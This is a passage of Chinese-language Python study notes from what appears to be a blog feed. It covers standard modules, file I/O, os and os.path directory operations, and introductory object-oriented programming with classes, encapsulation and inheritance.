class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import sys<br><span class="hljs-built_in">print</span>(sys.getsizeof(24))# 获得所占内存大小 28<br><span class="hljs-built_in">print</span>(sys.getsizeof(45))#28<br><span class="hljs-built_in">print</span>(sys.getsizeof(<span class="hljs-literal">True</span>))#28<br><span class="hljs-built_in">print</span>(sys.getsizeof(<span class="hljs-literal">False</span>))#24<br>import time<br><span class="hljs-built_in">print</span>(time.time())#1663919662.3144715<br><span class="hljs-built_in">print</span>(time.localtime(time.time()))#time.struct_time(<span class="hljs-attribute">tm_year</span>=2022, <span class="hljs-attribute">tm_mon</span>=9, <span class="hljs-attribute">tm_mday</span>=23, <span class="hljs-attribute">tm_hour</span>=15, <span class="hljs-attribute">tm_min</span>=54, <span class="hljs-attribute">tm_sec</span>=53, <span class="hljs-attribute">tm_wday</span>=4, <span class="hljs-attribute">tm_yday</span>=266, <span class="hljs-attribute">tm_isdst</span>=0)<br>import urllib.request<br><span class="hljs-built_in">print</span>(urllib.request.urlopen(<span class="hljs-string">'http://www.baidu.com'</span>).read())<br>import math<br><span class="hljs-built_in">print</span>(math.pi)#3.141592653589793<br></code></pre></td></tr></tbody></table></figure><h2 id="第三方模块的安装及使用"><a href="#第三方模块的安装及使用" class="headerlink" title="第三方模块的安装及使用"></a>第三方模块的安装及使用</h2><p>安装：<code>pip install 模块名</code></p><p>使用：<code>import 模块名</code></p><p>eg: <code>pip install schedule</code></p><p>ps：因为我电脑中是python2 3共存，所以先去安装了一下pip</p><p>pip下载地址：</p><p><a href="https://pypi.org/project/pip/#files" title="pip下载地址">https://pypi.org/project/pip/#files</a></p><p>安装：<code>python3.exe -m pip install pip22全名</code></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> schedule<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">job</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'哈哈----'</span>)<br> <span class="hljs-comment">#每三秒执行一次job()</span><br>schedule.every(<span class="hljs-number">3</span>).seconds.do(job)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    schedule.run_pending()<span class="hljs-comment">#启动</span><br>    time.sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">#给予缓冲时间，休眠一秒</span><br></code></pre></td></tr></tbody></table></figure><h1 id="编码格式"><a href="#编码格式" class="headerlink" title="编码格式"></a>编码格式</h1><p>python解释器 ——Unicode(内存)</p><p>.py文件 在磁盘上 ——UTF-8(外存)</p><p><img src="/unicode.png"></p><p>eg: <code>#encoding=GBK</code></p><h1 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h1><ol><li><p>文件读写俗称‘IO操作’</p></li><li><p>内置函数open()创建文件对象</p><p> file=open(filename [,mode,encoding])</p></li></ol><p>file: 被创建的文件对象</p><p>mode: 打开模式默认为只读</p><p>encoding: 默认文本文件中字符的编写格式为GBK</p><p>eg:</p><ol><li>在磁盘上创建a.txt，内容：’中国’</li><li>用pycharm打开，转GBK</li><li>新建.py文件</li></ol><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">'a.txt'</span>,<span class="hljs-string">'r'</span>,encoding=<span class="hljs-string">'UTF-8'</span>)<span class="hljs-comment">#r 只读</span><br>print(<span class="hljs-built_in">file</span>.readlines())<span class="hljs-comment">#['中国\n']</span><br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">close</span>()<span class="hljs-comment">#关闭系统释放资源</span><br></code></pre></td></tr></tbody></table></figure><p>ps: 转不了GBK,只好在读取的时候就设定编码格式了</p><h2 id="常用文件打开模式"><a href="#常用文件打开模式" class="headerlink" title="常用文件打开模式"></a>常用文件打开模式</h2><p>按文件中数据的组织形式分类：</p><ul><li>文本文件：存储普通’字符’文本，默认unicode，可用txt打开</li><li>二进制文件：以’字节’存储，必须用专用软件打开</li></ul><p>打开模式：</p><ul><li>r 只读，文件指针在文件开头</li><li>w 只写，文件不存在则创建，存在则覆盖原内容，文件指针在文件开头</li><li>a 追加，文本不在则创建，存在则在原内容后追加内容，文件指针在文件末尾</li><li>b 以二进制方式打开文件，不可单独使用</li><li><code>+</code> 读写，不可单独使用</li></ul><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">'b.txt'</span>,<span class="hljs-string">'w'</span>)<br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(<span class="hljs-string">'Python'</span>)<br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></tbody></table></figure><p>创建了b.txt，内容为：Python</p><p>eg:</p><p>在根目录下添加图片：logo.png</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">src_file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'logo.png'</span>,<span class="hljs-string">'rb'</span>)<span class="hljs-comment">#打开logo.png,只读</span><br>target_file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'copylogo.png'</span>,<span class="hljs-string">'wb'</span>)<span class="hljs-comment">#创建copylogo.png</span><br>target_file.<span class="hljs-built_in">write</span>(src_file.<span class="hljs-built_in">read</span>())<span class="hljs-comment">#读取的logo.png内容写到copylogo.png中</span><br>target_file.<span class="hljs-built_in">close</span>()<span class="hljs-comment">#释放资源</span><br>src_file.<span class="hljs-built_in">close</span>()<span class="hljs-comment">#释放资源</span><br></code></pre></td></tr></tbody></table></figure><h2 id="文件对象的常用方法"><a href="#文件对象的常用方法" class="headerlink" title="文件对象的常用方法"></a>文件对象的常用方法</h2><ul><li>read([size]) 从文件中读size个字节或字符内容，返回略。若无size值则读取全部</li><li>readline() 读一行</li><li>readlines() 读每一行，单独成对象放入列表中</li><li>write(str) 将str写入文件</li><li>writelines(s_list) 将列表s_list写入文件，不加换行符</li><li>seek(offest[where])</li><li>tell() 返回文件指针当前位置</li><li>flush() 缓冲区内容写入文件，但不关闭文件</li><li>close() 缓冲股权内容写入文件，同事关闭文件，释放资源</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'a.txt'</span>,<span class="hljs-string">'r'</span>,encoding=<span class="hljs-string">'utf-8'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.read()</span></span>)#中国\n美丽<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.read(<span class="hljs-number">2</span>)</span></span>)#中国<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.readline()</span></span>)#中国<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.readlines()</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'中国\n'</span>, <span class="hljs-string">'美丽'</span>]</span><br> <span class="hljs-selector-id">#seek</span> tell writelines<br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'c.txt'</span>,<span class="hljs-string">'a'</span>)<br>file<span class="hljs-selector-class">.write</span>(<span class="hljs-string">'hello'</span>)<br>lst=<span class="hljs-selector-attr">[<span class="hljs-string">'java'</span>,<span class="hljs-string">'go'</span>,<span class="hljs-string">'python'</span>]</span><br>file<span class="hljs-selector-class">.writelines</span>(lst)<span class="hljs-selector-id">#hellohellojavagopython</span><br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'c.txt'</span>,<span class="hljs-string">'r'</span>)<br>file<span class="hljs-selector-class">.seek</span>(<span class="hljs-number">2</span>)#从第二个字节开始读<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.read()</span></span>)<span class="hljs-selector-id">#llohellojavagopython</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.tell()</span></span>)#<span class="hljs-number">22</span><br> <span class="hljs-selector-id">#flush</span>()<br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'d.txt'</span>,<span class="hljs-string">'a'</span>)<br>file<span class="hljs-selector-class">.write</span>(<span class="hljs-string">'hello'</span>)<br>file<span class="hljs-selector-class">.flush</span>()<br>file<span class="hljs-selector-class">.write</span>(<span class="hljs-string">' world'</span>)<span class="hljs-selector-id">#hello</span> world<br>file<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></tbody></table></figure><h2 id="with语句（上下文管理器）"><a href="#with语句（上下文管理器）" class="headerlink" title="with语句（上下文管理器）"></a>with语句（上下文管理器）</h2><p>自动管理上下文资源，确保文件正确关闭释放资源</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'b.txt'</span>,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    print(<span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>())<span class="hljs-comment">#Python</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'logo.png'</span>,<span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> src_file:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'copy2logo.png'</span>,<span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> target_file:<br>        target_file.<span class="hljs-built_in">write</span>(src_file.<span class="hljs-built_in">read</span>())<br></code></pre></td></tr></tbody></table></figure><h1 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h1><p>os模块与操作系统有关</p><p>os模块与os.path模块对目录或文件操作</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> os<br>os.<span class="hljs-keyword">system</span>(<span class="hljs-string">'notepad.exe'</span>)#打开记事本<br>os.<span class="hljs-keyword">system</span>((<span class="hljs-string">'calc.exe'</span>))#打开计算器<br> #直接调用可执行文件<br>os.startfile(<span class="hljs-string">'..\\Tencent\\QQ\\Bin\\QQ.exe'</span>)# 打开QQ<br></code></pre></td></tr></tbody></table></figure><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><ul><li>getcwd() 返回当前工作目录</li><li>listdir(path) 返回指定路径下的文件和目录信息</li><li>mkdir(path [,mode]) 创建目录</li><li>makedirs(path/path1/……） 创建多级目录</li><li>rmdir() 删除目录</li><li>removedirs() 删除多级目录</li><li>chdir() 将path设置为当前工作目录</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import os<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(os.getcwd()</span></span>)<br>lst=os<span class="hljs-selector-class">.listdir</span>(<span class="hljs-string">'../python学习下-面向对象'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lst)</span></span><br>os<span class="hljs-selector-class">.mkdir</span>(<span class="hljs-string">'newdir'</span>)<br>os<span class="hljs-selector-class">.makedirs</span>(<span class="hljs-string">'A/B/C'</span>)<br> <span class="hljs-selector-id">#os</span><span class="hljs-selector-class">.rmdir</span>(<span class="hljs-string">'newdir'</span>)<br> <span class="hljs-selector-id">#os</span><span class="hljs-selector-class">.removedirs</span>(<span class="hljs-string">'A/B/C'</span>)<br>os<span class="hljs-selector-class">.chdir</span>(<span class="hljs-string">'..\\python学习下-面向对象'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(os.getcwd()</span></span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="os-path模块相关函数"><a href="#os-path模块相关函数" class="headerlink" title="os.path模块相关函数"></a>os.path模块相关函数</h2><ul><li>abspath(path) 获取绝对路径</li><li>exists() 判断目录是否存在，在True,不在False</li><li>join(path,name) 将目录与目录或文件名拼接起来</li><li>splitext() 分离文件名和扩展名</li><li>basename() 从一个目录中提取文件名</li><li>dirname(path) 从一个路径中提取文件路径，不包括文件名</li><li>isdir(path) 用于判断是否为路径</li></ul><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.abspath(<span class="hljs-string">'demo14.py'</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(<span class="hljs-string">'demo2.py'</span>)) # True<br><span class="hljs-built_in">print</span>((<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.join(<span class="hljs-string">'D:\\'</span>,<span class="hljs-string">'demo14.py'</span>))) #D:\demo14.py<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.split(<span class="hljs-string">'demo14.py'</span>)) #(<span class="hljs-string">''</span>, <span class="hljs-string">'demo14.py'</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.splitext(<span class="hljs-string">'demo14.py'</span>)) #(<span class="hljs-string">'demo14'</span>, <span class="hljs-string">'.py'</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.basename(<span class="hljs-string">'D:\demo14.py'</span>)) #demo14.py<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.dirname(<span class="hljs-string">'D:\demo14.py'</span>)) #D:\<br></code></pre></td></tr></tbody></table></figure><p>eg: 列出指定目录下的所有py文件</p><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span><br><span class="hljs-built_in">path</span>=<span class="hljs-built_in">os</span>.getcwd()<br>lst=<span class="hljs-built_in">os</span>.listdir(<span class="hljs-built_in">path</span>)<br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> lst:<br>    <span class="hljs-keyword">if</span> filename.endswith(<span class="hljs-string">'.py'</span>):<br>        <span class="hljs-built_in">print</span>(filename)<br></code></pre></td></tr></tbody></table></figure><p>eg: 目录如下：</p><ul><li>python:<ul><li>demo16.py</li><li>newdir:<ul><li>1.py</li><li>2.py</li><li>sub:<ul><li>sub1.py</li></ul></li></ul></li></ul></li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import os<br><span class="hljs-attribute">path</span>=os.getcwd()<br><span class="hljs-attribute">lst_files</span>=os.walk(path)<br><span class="hljs-keyword">for</span> dirpath,dirname,filename <span class="hljs-keyword">in</span> lst_files:<br>    <span class="hljs-built_in">print</span>(dirpath)<br>    <span class="hljs-built_in">print</span>(dirname)<br>    <span class="hljs-built_in">print</span>(filename)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'-------------'</span>)<br>    <span class="hljs-keyword">for</span> dir <span class="hljs-keyword">in</span> dirname:<br>        <span class="hljs-built_in">print</span>(os.path.join(dirpath,dir))<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> filename:<br>        <span class="hljs-built_in">print</span>(os.path.join(dirpath,file))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'------------------'</span>)<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习8</title>
    <link href="/2022/09/19/python%E5%AD%A6%E4%B9%A08/"/>
    <url>/2022/09/19/python%E5%AD%A6%E4%B9%A08/</url>
    
    <content type="html"><![CDATA[<p>面向对象篇啦！！！！</p><h1 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h1><p>类：多个类似事物组成的群体；数据类型</p><p>对象：100，99是int类下包含的相似不相同个例，称为实例或对象（一切皆对象）</p><h2 id="类的创建"><a href="#类的创建" class="headerlink" title="类的创建"></a>类的创建</h2><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">Student:</span><br><span class="hljs-symbol">    <span class="hljs-symbol">pass</span></span><br></code></pre></td></tr></tbody></table></figure><p>类的组成：类属性、实例方法、静态方法、类方法</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span><span class="hljs-symbol">:</span><span class="hljs-comment">#Student为类名，由一个或多个单词组成，每个单词首字母大写，其余小写</span><br>    native_pace=<span class="hljs-string">'内蒙'</span><span class="hljs-comment">#直接写在类中的变量成为类属性</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,name,age</span>)<span class="hljs-symbol">:</span><span class="hljs-comment">#初始化</span><br>        <span class="hljs-variable language_">self</span>.name=name<span class="hljs-comment">#self.name成为实体属性，进行了赋值操作，将局部变量name值赋给实体属性</span><br>        <span class="hljs-variable language_">self</span>.age=age<br>    <span class="hljs-comment">#实例方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">eat</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-string">'学生吃饭函数'</span>)<br>    <span class="hljs-comment">#静态方法</span><br>    <span class="hljs-variable">@staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">method</span>():<br>        print(<span class="hljs-string">'使用staticmethod进行修饰，为静态方法'</span>)<br>    <span class="hljs-comment">#类方法</span><br>    <span class="hljs-variable">@classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cm</span>(<span class="hljs-params">cls</span>):<br>        print(<span class="hljs-string">'使用classmethod进行修饰，为类方法'</span>)<br> <span class="hljs-comment">#在类之外定义的称为函数，在之内的称为方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drink</span>():<br>    print(<span class="hljs-string">'类之外定义的，是函数'</span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p>又称类的实例化：实例名=类名()</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">stu=<span class="hljs-built_in">Student</span>(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu.name)</span></span>#实例属性<span class="hljs-selector-id">#Jack</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu.age)</span></span>#<span class="hljs-number">20</span><br>stu<span class="hljs-selector-class">.eat</span>()#学生吃饭函数<br>Student<span class="hljs-selector-class">.eat</span>(stu)#学生吃饭函数,二者功能相同<br></code></pre></td></tr></tbody></table></figure><h2 id="类属性，类方法，静态方法"><a href="#类属性，类方法，静态方法" class="headerlink" title="类属性，类方法，静态方法"></a>类属性，类方法，静态方法</h2><p>1.类属性：类中方法外的变量为类属性，被该类所有对象共享</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(Student.native_pace)</span></span>#内蒙<br>stu1=<span class="hljs-built_in">Student</span>(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br>stu2=<span class="hljs-built_in">Student</span>(<span class="hljs-string">'Rose'</span>,<span class="hljs-number">30</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu1.native_pace)</span></span>#内蒙<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu2.native_pace)</span></span>#内蒙<br>Student.native_pace=<span class="hljs-string">'天津'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu1.native_pace)</span></span>#天津<br></code></pre></td></tr></tbody></table></figure><p>2.类方法：使用<code>@classmethod</code>修饰，用类名直接访问</p><pre><code class="hljs">Student.cm()</code></pre><p>3.静态方法：使用<code>@staticmethod</code>修饰，用类名直接访问</p><pre><code class="hljs">Student.method()</code></pre><p>4.动态绑定属性和方法</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,name,age</span>):<br>        <span class="hljs-variable language_">self</span>.name=name<br>        <span class="hljs-variable language_">self</span>.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">eat</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-variable language_">self</span>.name+<span class="hljs-string">'在吃饭'</span>)<br>stu1=Student(<span class="hljs-string">'张三'</span>,<span class="hljs-number">20</span>)<br>stu2=Student(<span class="hljs-string">'李四'</span>,<span class="hljs-number">30</span>)<br>stu1.gender=<span class="hljs-string">'女'</span><span class="hljs-comment">#动态绑定属性</span><br>print(stu1.name,stu1.age,stu1.gender)<span class="hljs-comment">#张三 20 女</span><br>print(stu2.name,stu2.age)<span class="hljs-comment">#李四 30</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>()<span class="hljs-symbol">:</span><span class="hljs-comment">#动态绑定方法</span><br>    print(<span class="hljs-string">'定义在类之外，称为函数'</span>)<br>stu1.show=show<br>stu1.show()<span class="hljs-comment">#定义在类之外，称为函数</span><br></code></pre></td></tr></tbody></table></figure><h1 id="面向对象三大特征"><a href="#面向对象三大特征" class="headerlink" title="面向对象三大特征"></a>面向对象三大特征</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>提高程序安全性，将数据（属性）和行为（方法）包装到类对象中，在方法内部对属性进行操作，在类对象的为外部调用方法。</p><p>在python表属性私有，不希望属性在类对象外部被调用，前面加两个下划线。</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,brand</span>):<br>        <span class="hljs-variable language_">self</span>.brand=brand<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-string">'汽车已启动'</span>)<br>car=Car(<span class="hljs-string">'宝马X5'</span>)<br>car.start()<span class="hljs-comment">#汽车已启动</span><br>print(car.brand)<span class="hljs-comment">#宝马X5</span><br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.__age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name,self.__age)<br>stu=Student(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br>stu.show()<span class="hljs-comment">#Jack 20</span><br><span class="hljs-built_in">print</span>(stu.name)<span class="hljs-comment">#Jack</span><br> <span class="hljs-comment">#print(stu.__age)#类外不可调用私有</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(stu))<br><span class="hljs-built_in">print</span>(stu._Student__age)<span class="hljs-comment">#在类外可以使用_Student__age访问私有</span><br></code></pre></td></tr></tbody></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>提高的代码复用性</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">class</span> <span class="hljs-constructor">Person(<span class="hljs-params">object</span>)</span>:<br>    def <span class="hljs-constructor">__init__(<span class="hljs-params">self</span>,<span class="hljs-params">name</span>,<span class="hljs-params">age</span>)</span>:<br>        self.name=name<br>        self.age=age<br>    def info(self):<br>        print(self.name,self.age)<br><span class="hljs-keyword">class</span> <span class="hljs-constructor">Student(Person)</span>:<br>    def <span class="hljs-constructor">__init__(<span class="hljs-params">self</span>,<span class="hljs-params">name</span>,<span class="hljs-params">age</span>,<span class="hljs-params">num</span>)</span>:<br>        super<span class="hljs-literal">()</span>.<span class="hljs-constructor">__init__(<span class="hljs-params">name</span>,<span class="hljs-params">age</span>)</span><br>        self.num=num<br><span class="hljs-keyword">class</span> <span class="hljs-constructor">Teacher(Person)</span>:<br>    def <span class="hljs-constructor">__init__(<span class="hljs-params">self</span>,<span class="hljs-params">name</span>,<span class="hljs-params">age</span>,<span class="hljs-params">tyear</span>)</span>:<br>        super<span class="hljs-literal">()</span>.<span class="hljs-constructor">__init__(<span class="hljs-params">name</span>,<span class="hljs-params">age</span>)</span><br>        self.tyear=tyear<br>stu=<span class="hljs-constructor">Student('Jack',20,'1001')</span><br>teacher=<span class="hljs-constructor">Teacher('Rose',30,10)</span><br>stu.info<span class="hljs-literal">()</span>#Jack <span class="hljs-number">20</span><br>teacher.info<span 